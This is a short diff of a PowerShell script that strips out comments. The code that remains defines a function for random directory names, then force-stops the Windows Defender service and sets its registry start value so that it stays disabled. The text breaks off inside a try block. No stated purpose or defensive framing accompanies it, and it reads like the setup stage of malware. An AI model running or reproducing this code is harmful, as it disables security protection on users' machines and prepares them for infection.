@@ -1,12 +1,7 @@
-# create random staring for directory
-
 function getRandom() {
-    # random text
     return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
 }
 
-
-# windows defender disabled
 try {
     Get-Service WinDefend | Stop-Service -Force
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend" -Name "Start" -Value 4 -Type DWORD -Force
